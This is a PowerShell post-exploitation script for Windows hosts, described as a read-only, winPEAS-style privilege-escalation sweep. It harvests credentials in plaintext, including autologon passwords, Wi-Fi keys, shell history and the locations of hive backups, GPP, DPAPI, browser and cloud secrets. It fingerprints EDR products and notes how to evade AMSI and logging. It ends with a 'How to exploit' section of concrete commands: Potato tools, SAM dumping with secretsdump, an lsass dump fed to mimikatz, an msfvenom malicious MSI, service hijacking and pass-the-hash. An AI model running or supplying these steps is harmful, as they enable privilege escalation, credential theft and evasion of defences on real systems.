<#
  recce-enum.ps1 - thorough, READ-ONLY local enumeration for Windows.

  The on-target companion to recce: run this once you have a shell on a Windows
  host to surface privilege-escalation vectors and sensitive exposure (a
  winPEAS-style sweep). It changes NOTHING - only reads system state with
  built-in cmdlets / reg queries - so it is safe to run and does not behave like
  malware. No exploit code, no download, no obfuscation, no AMSI/Defender
  tampering. Being a plain read-only Get-* script is exactly why it does not
  match malware signatures; if an EDR still false-positives, coordinate an
  exclusion rather than evading it.

  Usage:
    powershell -ep bypass -File .\recce-enum.ps1 [-Quiet] [-OutFile report.txt]
      -SelfTest  pre-flight only: parse-check the script + report which sections
                 will run on this host. Runs NO enumeration - safe first step.
      -Quiet     findings only (skip the raw dumps)
      -OutFile   also write everything to a file

  Lines marked [!] are worth a closer look.
#>
[CmdletBinding()]
param([switch]$SelfTest, [switch]$Quiet, [string]$OutFile)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

function Emit($t){ if($OutFile){ $t | Out-File -Append -FilePath $OutFile -Encoding utf8 }; Write-Host $t }
function Sec($t){ Emit ""; Emit ("==== " + $t + " ====") }
function Info($t){ if(-not $Quiet){ Emit ("    " + $t) } }
function Finding($t){ Emit ("[!] " + $t) }
function RegGet($p,$n){ try{ (Get-ItemProperty -Path $p -Name $n).$n }catch{ $null } }
function TestWritable($path){
  if(-not $path -or -not (Test-Path $path)){ return $false }
  try{
    $acl = Get-Acl $path
    $me  = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $ids = @($me.User.Value) + $me.Groups.Value
    foreach($ace in $acl.Access){
      if($ace.AccessControlType -ne 'Allow'){ continue }
      if($ids -notcontains $ace.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value){ continue }
      if($ace.FileSystemRights -match 'Write|Modify|FullControl|TakeOwnership|ChangePermissions'){ return $true }
    }
  }catch{}
  return $false
}

# ============================================================ self-test (pre-flight)
if($SelfTest){
  Write-Host "recce-enum.ps1 self-test - verifies the script + host; runs NO enumeration"
  Write-Host ""
  # 1) Syntax: parse this very file with the PowerShell parser.
  if($PSCommandPath -and (Test-Path $PSCommandPath)){
    $perr = $null
    [System.Management.Automation.Language.Parser]::ParseFile($PSCommandPath, [ref]$null, [ref]$perr) | Out-Null
    if($perr -and $perr.Count){
      Write-Host ("[FAIL] " + $perr.Count + " syntax error(s):")
      $perr | ForEach-Object { Write-Host ("       L" + $_.Extent.StartLineNumber + ": " + $_.Message) }
    } else { Write-Host "[ OK ] script parses cleanly (no syntax errors)" }
  } else { Write-Host "[warn] cannot locate the script file to parse (run with -File)" }
  # 2) Host environment.
  Write-Host ("[info] PowerShell " + $PSVersionTable.PSVersion + " " + $PSVersionTable.PSEdition +
              " | policy=" + (Get-ExecutionPolicy) + " | lang=" + $ExecutionContext.SessionState.LanguageMode)
  $admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
  Write-Host ("[info] Elevated (admin): " + $admin + "   (elevated reads more; unelevated still works)")
  # 3) Command availability -> which section families will produce data here.
  $checks = [ordered]@{
    'System & patches'      = @('Get-CimInstance','Get-HotFix')
    'Users & groups'        = @('Get-LocalUser','Get-LocalGroupMember','net','quser')
    'Services & tasks'      = @('Get-CimInstance','Get-ScheduledTask')
    'Credentials'           = @('cmdkey','klist','netsh','reg')
    'Hardening / Defender'  = @('Get-MpComputerStatus','Get-BitLockerVolume','Get-AppLockerPolicy')
    'Network'               = @('ipconfig','netstat','Get-SmbShare','Get-NetFirewallProfile')
    'Core (always needed)'  = @('whoami','Get-ItemProperty','Get-Process')
  }
  foreach($k in $checks.Keys){
    $missing = @($checks[$k] | Where-Object { -not (Get-Command $_ -ErrorAction SilentlyContinue) })
    if($missing.Count -eq 0){ Write-Host ("[ OK ] " + $k) }
    else { Write-Host ("[skip] " + $k + "  - missing: " + ($missing -join ', ') + " (those checks self-skip)") }
  }
  Write-Host ""
  Write-Host "Self-test complete. If the parse is OK, a real run is safe:  .\recce-enum.ps1"
  return
}

if($OutFile){ "" | Out-File -FilePath $OutFile -Encoding utf8 }
Emit ("recce-enum  host=" + $env:COMPUTERNAME + "  user=" + $env:USERNAME + "  " + (Get-Date))
Emit  "read-only local enumeration - nothing on this host is modified"

# ============================================================ system
Sec "System & patches"
$os = Get-CimInstance Win32_OperatingSystem
Info ("OS: " + $os.Caption + " (build " + $os.BuildNumber + ", " + $os.OSArchitecture + ")")
Info ("Installed: " + $os.InstallDate + "   LastBoot: " + $os.LastBootUpTime)
Info ("Domain: " + (Get-CimInstance Win32_ComputerSystem).Domain + "   Part-of-domain: " + (Get-CimInstance Win32_ComputerSystem).PartOfDomain)
$hf = Get-HotFix | Sort-Object InstalledOn -Descending
Info ("Hotfixes: " + $hf.Count + " installed; most recent:")
$hf | Select-Object -First 8 | ForEach-Object { Info ("   " + $_.HotFixID + "  " + $_.InstalledOn) }
Finding "Feed the OS build + hotfix list to Watson / WES-NG offline for missing-patch LPE candidates"

# ============================================================ current context
Sec "Who am I / privileges (Potato preconditions)"
Info ("User: " + (whoami) + "   SID: " + ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value)
$priv = (whoami /priv) 2>$null
$priv | Where-Object { $_ -match 'Se\w+Privilege' } | ForEach-Object { Info $_.Trim() }
$hasImp = ($priv -match 'SeImpersonatePrivilege\s+.*Enabled') -or ($priv -match 'SeAssignPrimaryTokenPrivilege\s+.*Enabled')
if($hasImp){
  Finding "SeImpersonate / SeAssignPrimaryToken held -> Potato to SYSTEM on patched Win10/11 & Server 2016-2022:"
  Finding "   GodPotato / SigmaPotato (DCOM/RPC, most reliable), PrintSpoofer (spooler pipe),"
  Finding '   SharpEfsPotato / EfsPotato (MS-EFSR), JuicyPotatoNG. e.g.  GodPotato -cmd "cmd /c whoami"'
}
if($priv -match 'SeBackupPrivilege\s+.*Enabled'){ Finding "SeBackupPrivilege -> read any file (SAM/SYSTEM/NTDS) -> hash dump" }
if($priv -match 'SeRestorePrivilege\s+.*Enabled'){ Finding "SeRestorePrivilege -> write any file / service hijack -> SYSTEM" }
if($priv -match 'SeTakeOwnershipPrivilege\s+.*Enabled'){ Finding "SeTakeOwnershipPrivilege -> take ownership of protected objects" }
if($priv -match 'SeLoadDriverPrivilege\s+.*Enabled'){ Finding "SeLoadDriverPrivilege -> load a vulnerable driver (BYOVD) -> kernel" }
if($priv -match 'SeDebugPrivilege\s+.*Enabled'){ Finding "SeDebugPrivilege -> inject into SYSTEM processes" }
Info "Group membership:"
whoami /groups 2>$null | Where-Object { $_ -match 'S-1-|Administrators|BUILTIN' } | ForEach-Object { Info $_.Trim() }
if((whoami /groups) -match 'S-1-5-32-544'){ Finding "Current token is in the local Administrators group (may need UAC bypass to use it)" }
# Process integrity level (Medium = UAC-limited; High/System = already elevated).
$il = (whoami /groups) 2>$null | Select-String 'Mandatory Level'
if($il){ Info ("Integrity level: " + ($il -replace '.*Mandatory Level\s*','' -split '\s{2,}')[0]) }

# ============================================================ users & groups
Sec "Users, groups & password policy"
Get-LocalUser | ForEach-Object { Info ("user: " + $_.Name + "  enabled=" + $_.Enabled + "  lastlogon=" + $_.LastLogon) }
Info "Local Administrators:"
Get-LocalGroupMember -Group "Administrators" 2>$null | ForEach-Object { Info ("   " + $_.Name) }
Info "Logged-on / sessions:"
(quser) 2>$null | ForEach-Object { Info $_ }
Info "Password policy:"
(net accounts) 2>$null | ForEach-Object { Info $_ }

# ============================================================ services
Sec "Services (unquoted paths, weak perms, writable binaries)"
$svcs = Get-CimInstance Win32_Service
foreach($s in $svcs){
  $p = $s.PathName
  if(-not $p){ continue }
  # Unquoted service path with a space + running as a privileged account.
  if($p -notmatch '^\s*"' -and $p -match ' ' -and $p -notmatch '^\s*[A-Za-z]:\\Windows\\'){
    if($s.StartName -match 'LocalSystem|NT AUTHORITY'){ Finding ("Unquoted service path: " + $s.Name + " -> " + $p + " (" + $s.StartName + ")") }
  }
  # Writable service binary -> replace it.
  $bin = ($p -replace '^"','' -replace '".*$','') -replace '\s+[-/].*$',''
  if($bin -match '\.exe$' -and (TestWritable $bin)){ Finding ("Writable service binary: " + $bin + " (" + $s.Name + ")") }
}
# Writable service registry keys (change ImagePath).
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services 2>$null | ForEach-Object {
  if(TestWritable $_.PSPath){ Finding ("Writable service registry key: " + $_.PSChildName) }
} | Select-Object -First 20

# ============================================================ scheduled tasks
Sec "Scheduled tasks (writable actions)"
Get-ScheduledTask 2>$null | Where-Object { $_.State -ne 'Disabled' } | ForEach-Object {
  $act = $_.Actions.Execute
  foreach($a in $act){
    if(-not $a){ continue }
    $exe = [System.Environment]::ExpandEnvironmentVariables($a) -replace '^"','' -replace '".*$',''
    if((Test-Path $exe) -and (TestWritable $exe)){
      Finding ("Writable scheduled-task binary: " + $exe + "  (task: " + $_.TaskName + ", run-as: " + $_.Principal.UserId + ")")
    }
  }
}

# ============================================================ AlwaysInstallElevated
Sec "AlwaysInstallElevated"
$aie1 = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' 'AlwaysInstallElevated'
$aie2 = RegGet 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' 'AlwaysInstallElevated'
if($aie1 -eq 1 -and $aie2 -eq 1){ Finding "AlwaysInstallElevated = 1 (HKLM+HKCU) -> install a malicious MSI as SYSTEM (msiexec /i evil.msi)" }
else { Info ("AlwaysInstallElevated HKLM=" + $aie1 + " HKCU=" + $aie2 + " (need BOTH =1)") }

# ============================================================ autoruns
Sec "Autoruns & startup"
$runKeys = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
             'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
             'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run')
foreach($k in $runKeys){
  (Get-Item $k).Property | ForEach-Object {
    $v = (Get-ItemProperty $k $_).$_
    Info ("$k  $_ = $v")
    $exe = ($v -replace '^"','' -replace '".*$','')
    if((Test-Path $exe) -and (TestWritable $exe)){ Finding ("Writable autorun binary: " + $exe) }
  }
}
foreach($sf in @("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
                 "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup")){
  Get-ChildItem $sf 2>$null | ForEach-Object { Info ("startup item: " + $_.FullName) }
}

# ============================================================ credential hunting
Sec "Credential & secret hunting"
Info "Stored credentials (cmdkey):"
(cmdkey /list) 2>$null | ForEach-Object { Info $_ }
# Registry autologon.
$alu = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'DefaultUserName'
$alp = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'DefaultPassword'
if($alp){ Finding ("Autologon password in registry! user=" + $alu + " password=" + $alp) }
# Common secret-bearing files.
Info "Unattend / sysprep / config files:"
$credFiles = @("$env:WINDIR\Panther\Unattend.xml","$env:WINDIR\Panther\Unattended.xml",
  "$env:WINDIR\System32\Sysprep\sysprep.xml","$env:WINDIR\System32\Sysprep\sysprep.inf",
  "$env:WINDIR\system32\sysprep.inf","C:\unattend.xml","C:\sysprep.inf",
  "$env:WINDIR\debug\NetSetup.log","$env:ProgramData\McAfee\Common Framework\SiteList.xml")
foreach($f in $credFiles){ if(Test-Path $f){ Finding ("Sensitive file present: " + $f) } }
# SAM/SYSTEM backups readable.
foreach($f in @("$env:WINDIR\repair\SAM","$env:WINDIR\System32\config\RegBack\SAM","$env:WINDIR\repair\SYSTEM")){
  if(Test-Path $f){ Finding ("Registry hive backup readable: " + $f + " -> offline hash extraction") }
}
# PowerShell history.
$psh = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if(Test-Path $psh){ Info ("PowerShell history: " + $psh); if(-not $Quiet){ Get-Content $psh -Tail 25 | ForEach-Object { Info ("   >> " + $_) } } }
# Saved WiFi profiles + keys.
Info "WiFi profiles (key=clear shows the password):"
(netsh wlan show profiles) 2>$null | Select-String 'All User Profile' | ForEach-Object {
  $name = ($_ -split ':')[1].Trim()
  $key  = (netsh wlan show profile name="$name" key=clear | Select-String 'Key Content')
  if($key){ Finding ("WiFi " + $name + " -> " + ($key -split ':')[1].Trim()) }
}
# IIS web.config connection strings.
Info "IIS web.config search:"
Get-ChildItem C:\inetpub -Recurse -Filter web.config 2>$null | ForEach-Object {
  if(Select-String -Path $_.FullName -Pattern 'connectionString|password' -Quiet){ Finding ("Creds likely in: " + $_.FullName) }
}
# Registry-wide password string search (bounded).
Info "Registry password search (bounded):"
foreach($rk in @('HKLM:\SOFTWARE','HKCU:\SOFTWARE')){
  reg query ($rk -replace ':','') /f password /t REG_SZ /s 2>$null | Select-Object -First 15 | ForEach-Object { Info $_ }
}
# Group Policy Preferences cpassword - AES key is public, so these decrypt to
# plaintext domain creds. Search SYSVOL (if reachable) + the local GPO cache.
Info "GPP cpassword search (Groups.xml / Services.xml / etc.):"
$gppPaths = @("$env:SystemRoot\SYSVOL", "$env:ProgramData\Microsoft\Group Policy\History",
              "$env:ALLUSERSPROFILE\Microsoft\Group Policy\History")
$dom = (Get-CimInstance Win32_ComputerSystem).Domain
if($dom -and $dom -ne 'WORKGROUP'){ $gppPaths += "\\$dom\SYSVOL" }
foreach($gp in $gppPaths){
  Get-ChildItem -Path $gp -Recurse -Include Groups.xml,Services.xml,ScheduledTasks.xml,DataSources.xml,Printers.xml,Drives.xml -ErrorAction SilentlyContinue |
    ForEach-Object {
      if(Select-String -Path $_.FullName -Pattern 'cpassword' -Quiet){
        Finding ("GPP cpassword in: " + $_.FullName + " -> gpp-decrypt the cpassword value")
      }
    }
}
# DPAPI master keys + credential blobs (decrypt offline / with mimikatz on a lab).
Info "DPAPI master keys & credential blobs:"
foreach($dp in @("$env:APPDATA\Microsoft\Protect","$env:LOCALAPPDATA\Microsoft\Credentials",
                 "$env:APPDATA\Microsoft\Credentials","$env:SystemRoot\System32\config\systemprofile\AppData\Roaming\Microsoft\Protect")){
  if(Test-Path $dp){ Get-ChildItem $dp -Force -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Info ("   " + $_.FullName) } }
}
# Kerberos tickets in the current session.
Info "Kerberos tickets (klist):"
(klist) 2>$null | Select-String 'Client|Server|#' | Select-Object -First 20 | ForEach-Object { Info $_.ToString().Trim() }
# Cloud / orchestration creds.
foreach($cd in @("$env:USERPROFILE\.aws\credentials","$env:USERPROFILE\.azure","$env:USERPROFILE\.config\gcloud",
                 "$env:USERPROFILE\.kube\config","$env:APPDATA\gcloud\credentials.db")){
  if(Test-Path $cd){ Finding ("Cloud/orchestration creds present: " + $cd) }
}
# SCCM network-access account cache.
foreach($sc in @("$env:SystemRoot\ccmcache","HKLM:\SOFTWARE\Microsoft\SMS")){
  if(Test-Path $sc){ Info ("SCCM present: " + $sc + " (check for Network Access Account creds)") }
}
# App-specific stored sessions (often with recoverable passwords).
Info "App credential stores (PuTTY / WinSCP / OpenVPN / FileZilla / VNC):"
$ppk = RegGet 'HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions' 'HostName'
if(Test-Path 'HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions'){ Finding "PuTTY saved sessions present (check ProxyPassword / stored keys)" }
if(Test-Path 'HKCU:\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions'){ Finding "WinSCP saved sessions present -> passwords are recoverable" }
foreach($fz in @("$env:APPDATA\FileZilla\sitemanager.xml","$env:APPDATA\FileZilla\recentservers.xml")){
  if(Test-Path $fz){ Finding ("FileZilla stored servers: " + $fz + " (Base64 passwords)") }
}
Get-ChildItem "$env:USERPROFILE\OpenVPN\config","$env:PROGRAMFILES\OpenVPN\config" -Filter *.ovpn -ErrorAction SilentlyContinue | ForEach-Object { Info ("OpenVPN config: " + $_.FullName) }
foreach($vnc in @('HKLM:\SOFTWARE\RealVNC\vncserver','HKLM:\SOFTWARE\TightVNC\Server','HKCU:\SOFTWARE\ORL\WinVNC3\Password')){
  if(Test-Path $vnc){ Finding ("VNC server config present: " + $vnc + " (recoverable password)") }
}
# RDP saved connections + password-manager databases + browser creds.
if(Test-Path 'HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers'){
  Info "Saved RDP connections:"; (Get-ChildItem 'HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers').PSChildName | ForEach-Object { Info ("   " + $_) }
}
Get-ChildItem $env:USERPROFILE -Recurse -Include *.kdbx,*.kdb,*.psafe3,*.opvault -ErrorAction SilentlyContinue | ForEach-Object { Finding ("Password-manager DB: " + $_.FullName) } | Select-Object -First 10
foreach($br in @("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
                 "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data")){
  if(Test-Path $br){ Finding ("Browser saved-login DB: " + $br + " (DPAPI-protected; decrypt on the host)") }
}
Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Recurse -Include logins.json,key4.db -ErrorAction SilentlyContinue | ForEach-Object { Finding ("Firefox creds: " + $_.FullName) }

# ============================================================ hardening state
Sec "OS hardening & defences"
$uac = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'EnableLUA'
Info ("UAC EnableLUA=" + $uac + "  (0 = UAC off)")
$wd = RegGet 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' 'UseLogonCredential'
if($wd -eq 1){ Finding "WDigest UseLogonCredential=1 -> cleartext creds in LSASS memory" }
$lsa = RegGet 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'RunAsPPL'
Info ("LSA protection (RunAsPPL)=" + $lsa + "  (0/absent = LSASS not protected)")
try{ $dg = (Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning
      Info ("Credential/Device Guard running services: " + ($dg -join ',')) }catch{}
try{ $mp = Get-MpComputerStatus; Info ("Defender: RealTime=" + $mp.RealTimeProtectionEnabled + " Tamper=" + $mp.IsTamperProtected) }catch{ Info "Defender status: n/a" }
Info ("Language mode: " + $ExecutionContext.SessionState.LanguageMode)
try{ (Get-AppLockerPolicy -Effective -Xml) | Out-Null; Info "AppLocker policy present (review allowed paths)" }catch{ Info "AppLocker: none/unavailable" }
# UAC detail (bypass surface) + token-filter policy (pass-the-hash local admin).
$cpa = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'ConsentPromptBehaviorAdmin'
$fat = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'FilterAdministratorToken'
$latfp = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'LocalAccountTokenFilterPolicy'
Info ("UAC ConsentPromptBehaviorAdmin=" + $cpa + "  FilterAdministratorToken=" + $fat)
if($latfp -eq 1){ Finding "LocalAccountTokenFilterPolicy=1 -> local admin accounts usable remotely (PtH-friendly)" }
# PowerShell logging (if off, your activity is quieter; PSv2 dodges AMSI/CLM/logging).
$sbl = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' 'EnableScriptBlockLogging'
$ml  = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' 'EnableModuleLogging'
$tr  = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' 'EnableTranscripting'
Info ("PowerShell logging: ScriptBlock=" + $sbl + " Module=" + $ml + " Transcription=" + $tr)
if((Test-Path "$env:WINDIR\Microsoft.NET\Framework\v2.0.50727") -or (Test-Path "$env:WINDIR\Microsoft.NET\Framework64\v2.0.50727")){
  Info ".NET 2.0 present -> PowerShell v2 (powershell -v 2) downgrade dodges AMSI / SBL / CLM"
}
# LAPS (managed local-admin password) - reachable to some principals.
if((Test-Path "$env:ProgramFiles\LAPS\CSE\AdmPwd.dll") -or (RegGet 'HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd' 'AdmPwdEnabled')){
  Info "LAPS present -> if you can read ms-Mcs-AdmPwd in AD, you have the local admin password"
}
# BitLocker.
try{ (Get-BitLockerVolume -MountPoint C: 2>$null) | ForEach-Object { Info ("BitLocker C: " + $_.ProtectionStatus) } }catch{}
# NTLM / SMB posture.
$lmc = RegGet 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'LmCompatibilityLevel'
Info ("LmCompatibilityLevel=" + $lmc + "  (<3 allows weak NTLM/LM)")
try{ Info ("SMB signing required(server)=" + (Get-SmbServerConfiguration).RequireSecuritySignature) }catch{}
# WSUS over HTTP -> attacker-in-the-middle can push a malicious update (SYSTEM).
$wus = RegGet 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate' 'WUServer'
if($wus){ Info ("WSUS server: " + $wus); if($wus -match '^http://'){ Finding ("WSUS over cleartext HTTP (" + $wus + ") -> WSUSpect / update injection to SYSTEM") } }
# Sysmon (are your actions being recorded?).
if(Get-Service -Name Sysmon*,Sysmon64 -ErrorAction SilentlyContinue){ Info "Sysmon service present (activity is being logged)" }

# ============================================================ AV / EDR
Sec "AV / EDR detection"
Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct 2>$null | ForEach-Object { Info ("AV product: " + $_.displayName) }
$edr = 'CarbonBlack|cb.exe|cylance|CrowdStrike|csagent|SentinelOne|sentinel|cortex|traps|Sophos|MsMpEng|windefend|elastic|winlogbeat|xagt|FireEye|Tanium|Qualys|CylanceSvc|CSFalcon|WdFilter'
Get-Process 2>$null | Where-Object { $_.Name -match $edr } | Select-Object -Unique Name | ForEach-Object { Finding ("EDR/AV process: " + $_.Name) }
Get-Service 2>$null | Where-Object { $_.Name -match $edr -or $_.DisplayName -match $edr } | Select-Object -Unique Name | ForEach-Object { Info ("EDR/AV service: " + $_.Name) }

# ============================================================ named pipes / IFEO
Sec "Named pipes & image-hijack autoruns"
Info "Named pipes (pipe abuse / impersonation surface):"
try{
  [System.IO.Directory]::GetFiles("\\.\pipe\") | ForEach-Object { $_ -replace '\\\\\.\\pipe\\','' } |
    Sort-Object -Unique | Select-Object -First 40 | ForEach-Object { Info ("   " + $_) }
}catch{ Info "   (could not enumerate named pipes)" }
# Image File Execution Options debuggers + Winlogon userinit/shell hijacks.
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' 2>$null | ForEach-Object {
  $d = RegGet $_.PSPath 'Debugger'; if($d){ Finding ("IFEO debugger set on " + $_.PSChildName + " -> " + $d) }
}
$ui = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'Userinit'
$sh = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'Shell'
Info ("Winlogon Userinit=" + $ui + "  Shell=" + $sh + " (non-default values are suspicious / hijackable)")

# ============================================================ PATH / writable dirs
Sec "PATH & writable-directory hijack"
Info ("PATH: " + $env:PATH)
($env:PATH -split ';') | Where-Object { $_ } | ForEach-Object {
  if((Test-Path $_) -and (TestWritable $_)){ Finding ("Writable dir in PATH: " + $_ + " (binary/DLL planting)") }
}
foreach($pf in @("$env:ProgramFiles","${env:ProgramFiles(x86)}")){
  Get-ChildItem $pf -Directory 2>$null | ForEach-Object {
    if(TestWritable $_.FullName){ Finding ("Writable app dir under Program Files: " + $_.FullName + " (DLL hijack)") }
  } | Select-Object -First 10
}

# ============================================================ software / network
Sec "Installed software (versions -> match to CVEs offline)"
$uk = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*')
Get-ItemProperty $uk 2>$null | Where-Object { $_.DisplayName } |
  Select-Object DisplayName, DisplayVersion -Unique | Sort-Object DisplayName |
  ForEach-Object { Info ($_.DisplayName + "  " + $_.DisplayVersion) }

Sec "Network"
Info "IP config:"; (ipconfig /all) 2>$null | Select-String 'IPv4|Description|Default Gateway|DNS Servers|Physical' | ForEach-Object { Info $_.ToString().Trim() }
Info "Listening / connections:"; (netstat -ano) 2>$null | Select-String 'LISTENING|ESTABLISHED' | Select-Object -First 40 | ForEach-Object { Info $_.ToString().Trim() }
Info "Routes:"; (route print) 2>$null | Select-Object -First 20 | ForEach-Object { Info $_ }
Info "Shares:"; Get-SmbShare 2>$null | ForEach-Object { Info ($_.Name + "  " + $_.Path) }
Info ("Firewall profiles: "); (Get-NetFirewallProfile 2>$null) | ForEach-Object { Info ("   " + $_.Name + " enabled=" + $_.Enabled) }
# RDP exposure + NLA (NLA off widens the attack surface / allows some CVEs).
$rdpDeny = RegGet 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' 'fDenyTSConnections'
$nla     = RegGet 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' 'UserAuthentication'
Info ("RDP enabled=" + ($rdpDeny -eq 0) + "  NLA required=" + ($nla -eq 1))
if($rdpDeny -eq 0 -and $nla -ne 1){ Finding "RDP enabled with NLA OFF -> broader pre-auth surface" }

# ============================================================ processes / misc
Sec "Processes running as SYSTEM / other users"
Get-CimInstance Win32_Process | ForEach-Object {
  $o = Invoke-CimMethod -InputObject $_ -MethodName GetOwner -ErrorAction SilentlyContinue
  if($o.User){ "{0,-28} pid={1,-6} {2}\{3}" -f $_.Name,$_.ProcessId,$o.Domain,$o.User }
} | Sort-Object -Unique | Select-Object -First 60 | ForEach-Object { Info $_ }

Sec "Environment variables"
Get-ChildItem Env: | ForEach-Object { Info ($_.Name + "=" + $_.Value) }

# ============================================================ how to exploit
# Reference for the [!] findings above: if the script flagged a vector, here is
# the concrete escalation path. Read-only guidance - nothing is run for you.
Sec "How to exploit (reference for the [!] findings above)"
function Xploit($h, $lines){ Emit ("  [*] " + $h); foreach($l in $lines){ Emit ("      " + $l) } }
Xploit "SeImpersonate / SeAssignPrimaryToken -> SYSTEM (Potato)" @(
  'GodPotato -cmd "cmd /c whoami"      (DCOM/RPC; most reliable on patched Win10/11)',
  'PrintSpoofer64.exe -i -c cmd        (spooler named pipe)',
  'SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a whoami   (MS-EFSR)')
Xploit "SeBackupPrivilege" @(
  'reg save hklm\sam sam & reg save hklm\system system',
  'impacket-secretsdump -sam sam -system system LOCAL   (crack or pass-the-hash)',
  'on a DC: use diskshadow/VSS to copy NTDS.dit, then secretsdump')
Xploit "SeRestore / SeTakeOwnership" @(
  'takeown /f <system-file> && icacls <file> /grant %USERNAME%:F -> replace a SYSTEM binary/service',
  'or write to an auto-run/service path you now control')
Xploit "SeLoadDriver / SeDebug" @(
  'SeLoadDriver: load a known-vulnerable signed driver (BYOVD) -> kernel exec',
  'SeDebug: procdump -ma lsass.exe out.dmp -> mimikatz sekurlsa::minidump for creds')
Xploit "Unquoted service path" @(
  'place payload at the first space-truncated path, e.g. C:\Program.exe for "C:\Program Files\..."',
  'sc stop <svc> & sc start <svc>   (or wait for a reboot)')
Xploit "Writable service binary / registry key" @(
  'copy your exe over the ImagePath binary, or:',
  'reg add HKLM\SYSTEM\CurrentControlSet\Services\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\payload.exe /f',
  'then restart the service (or reboot)')
Xploit "AlwaysInstallElevated" @(
  'msfvenom -p windows/x64/exec CMD="..." -f msi -o evil.msi',
  'msiexec /quiet /qn /i C:\path\evil.msi     (runs as SYSTEM)')
Xploit "Writable autorun / scheduled-task binary" @(
  'replace the referenced binary with your payload and wait for the run/logon trigger')
Xploit "GPP cpassword" @(
  'gpp-decrypt <cpassword>   (AES key is public) -> plaintext domain creds',
  'use them with runas /netonly, psexec, or crackmapexec')
Xploit "Registry autologon / stored creds (cmdkey, vault, browser, KeePass)" @(
  'use plaintext DefaultUserName/DefaultPassword directly',
  'cmdkey creds: runas /savecred; browser/DPAPI: decrypt on-host; KeePass: crack the .kdbx offline')
Xploit "SAM/SYSTEM hive backup" @(
  'impacket-secretsdump -sam SAM -system SYSTEM LOCAL -> local hashes -> crack or pass-the-hash')
Xploit "WSUS over HTTP" @(
  'MITM the WSUS traffic and inject a signed built-in binary as an "update" (WSUSpect / PyWSUS) -> SYSTEM')
Xploit "LocalAccountTokenFilterPolicy=1" @(
  'the local admin hash works remotely:  crackmapexec smb <ip> -u admin -H <nthash> -x whoami')
Xploit "Writable PATH / Program Files dir (DLL hijack)" @(
  'drop a malicious DLL named after one the privileged app loads (check its imports / ProcMon) -> code exec')
Xploit "WDigest UseLogonCredential=1" @(
  'wait for/ trigger a privileged interactive logon, then dump LSASS for cleartext creds')
Emit "  Match each item to the [!] lines above. Operate only within your rules of engagement."

Emit ""
Emit "Done. Review every [!] line. Nothing was changed on this host."
if($OutFile){ Emit ("Full report written to: " + $OutFile) }
